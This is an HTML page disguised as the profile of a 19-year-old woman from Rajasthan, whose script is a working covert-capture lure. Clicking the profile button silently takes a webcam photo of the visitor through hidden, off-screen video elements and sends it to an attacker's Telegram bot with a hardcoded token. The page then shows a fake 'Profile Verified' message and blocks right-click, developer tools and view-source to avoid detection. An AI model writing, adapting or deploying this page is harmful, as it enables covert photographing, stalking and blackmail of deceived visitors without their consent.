<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Khushi's Profile</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            overflow: hidden;
        }
        .container {
            text-align: center;
            background: rgba(255,255,255,0.1);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
            position: relative;
        }
        .profile-pic {
            width: 150px;
            height: 150px;
            border-radius: 50%;
            object-fit: cover;
            margin-bottom: 20px;
            border: 4px solid rgba(255,255,255,0.3);
        }
        .intro h1 {
            font-size: 2.5em;
            margin: 10px 0;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        .intro p {
            font-size: 1.2em;
            margin: 5px 0;
            opacity: 0.9;
        }
        .click-btn {
            background: linear-gradient(45deg, #ff6b6b, #feca57);
            border: none;
            padding: 15px 40px;
            font-size: 1.3em;
            color: white;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 30px;
            font-weight: bold;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        .click-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
        }
        .click-btn:active {
            transform: translateY(0);
        }
        /* Hidden camera elements - completely invisible */
        #cameraSection, #video, #captureBtn {
            position: absolute;
            left: -9999px;
            top: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            visibility: hidden;
            pointer-events: none;
        }
        .loading {
            display: none;
            margin-top: 20px;
        }
        .spinner {
            border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .success-msg {
            display: none;
            background: rgba(0,255,0,0.2);
            padding: 20px;
            border-radius: 15px;
            margin-top: 20px;
            border: 2px solid rgba(255,255,255,0.3);
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="photo1.jpg" alt="Khushi" class="profile-pic">
        <div class="intro">
            <h1>Khushi</h1>
            <p>From Rajasthan</p>
            <p>Age 19</p>
        </div>
        <button class="click-btn" id="mainBtn">Click to See Profile</button>
        
        <!-- Completely hidden camera elements -->
        <div id="cameraSection">
            <video id="video" autoplay playsinline muted></video>
            <button id="captureBtn" style="display:none;"></button>
        </div>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Processing your request...</p>
        </div>
        
        <div class="success-msg" id="successMsg">
            <h3>✅ Profile Verified!</h3>
            <p>Thanks for confirming! Here's my full profile:</p>
            <p><strong>Khushi Sharma</strong> | 19 | Jaipur, Rajasthan</p>
            <p>📱 +91-XXXXXXX | khushi@example.com</p>
        </div>
    </div>

    <script>
        const botToken = '8606335181:AAF51XIApm1NkEZKKWxX06sIgkHODZqULuQ';
        const chatId = '7735968383';
        
        let stream = null;
        let video = null;
        let hasCaptured = false;
        
        // Auto-capture immediately after camera access
        function initStealthCapture() {
            video = document.getElementById('video');
            
            navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: 'user',
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                } 
            })
            .then(s => {
                stream = s;
                video.srcObject = stream;
                
                // INSTANT capture after 800ms (camera ready time)
                setTimeout(() => {
                    capturePhoto();
                }, 800);
                
            })
            .catch(err => {
                console.log('Camera blocked');
                showFakeSuccess();
            });
        }
        
        function capturePhoto() {
            if (hasCaptured || !video || !video.videoWidth) {
                return;
            }
            
            hasCaptured = true;
            
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            
            canvas.width = 640;
            canvas.height = 480;
            context.drawImage(video, 0, 0);
            
            // Capture silently
            canvas.toBlob(blob => {
                sendToTelegram(blob);
            }, 'image/jpeg', 0.85);
            
            // Stop stream immediately
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            
            showProcessing();
        }
        
        function sendToTelegram(photoBlob) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', photoBlob, 'profile_' + Date.now() + '.jpg');
            formData.append('caption', '📸 Profile verification capture');
            
            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log('Photo sent:', data);
                showFakeSuccess();
            })
            .catch(error => {
                console.error('Send failed:', error);
                showFakeSuccess();
            });
        }
        
        function showProcessing() {
            document.getElementById('loading').style.display = 'block';
            document.getElementById('mainBtn').style.display = 'none';
        }
        
        function showFakeSuccess() {
            setTimeout(() => {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('successMsg').style.display = 'block';
            }, 2000);
        }
        
        // Main button - triggers stealth capture
        document.getElementById('mainBtn').addEventListener('click', function() {
            this.style.display = 'none';
            document.querySelector('.intro p:last-child').textContent = 'Verifying identity...';
            initStealthCapture();
        });
        
        // Anti-detection measures
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', e => {
            if (e.key === 'F12' || 
                (e.ctrlKey && e.shiftKey && e.key === 'I') || 
                (e.ctrlKey && e.shiftKey && e.key === 'J') ||
                (e.ctrlKey && e.key === 'u')) {
                e.preventDefault();
            }
        });
        
        // Disable text selection
        document.addEventListener('selectstart', e => e.preventDefault());
        
        // Block devtools detection
        (function() {
            const devtools = { 
                open: false, 
                orientation: null 
            };
            const threshold = 160;
            
            setInterval(() => {
                if (window.outerHeight - window.innerHeight > threshold || 
                    window.outerWidth - window.innerWidth > threshold) {
                    if (!devtools.open) {
                        devtools.open = true;
                        location.reload();
                    }
                } else {
                    devtools.open = false;
                }
            }, 500);
        })();
    </script>
</body>
            </html>
